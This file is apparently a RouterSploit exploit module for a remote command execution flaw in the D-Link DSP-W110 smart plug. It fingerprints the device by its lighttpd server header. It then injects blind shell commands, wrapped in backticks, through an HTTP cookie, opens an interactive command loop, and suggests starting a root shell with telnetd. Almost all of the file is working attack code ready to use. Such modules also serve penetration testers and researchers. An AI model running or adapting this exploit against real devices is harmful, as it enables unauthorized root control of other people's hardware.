from routersploit import (
    exploits,
    print_status,
    print_error,
    http_request,
    mute,
    validators,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for D-Link DPS-W110 Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands on the device.
    """
    __info__ = {
        'name': 'D-Link DSP-W110 RCE',
        'description': 'Module exploits D-Link DSP-W110 Remote Command Execution vulnerability '
                       'which allows executing command on the operating system level.',
        'authors': [
            'Peter Adkins <peter.adkins[at]kernelpicnic.net',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://github.com/darkarnium/secpub/tree/master/D-Link/DSP-W110'
        ],
        'devices': [
            'D-Link DSP-W110 (Rev A) - v1.05b01'
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port', validators=validators.integer)

    def run(self):
        if self.check():
            print_status("Target might be vulnerable - difficult to verify")
            print_status("Invoking command loop...")
            print_status("It is blind command injection, response is not available.")
            print_status("Spawn root shell with telnetd -l/bin/sh")
            shell(self, architecture="mipsbe")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        if len(cmd) > 18:
            print_error("Command too long. Max is 18 characters.")
            return ""

        url = "{}:{}/".format(self.target, self.port)

        payload = "`{}`".format(cmd)

        cookies = {"i": payload}

        http_request(method="GET", url=url, cookies=cookies)
        return ""

    @mute
    def check(self):
        url = "{}:{}/".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is not None and "Server" in response.headers.keys() and "lighttpd/1.4.34" in response.headers['Server']:
            return True  # target is vulnerable

        return False
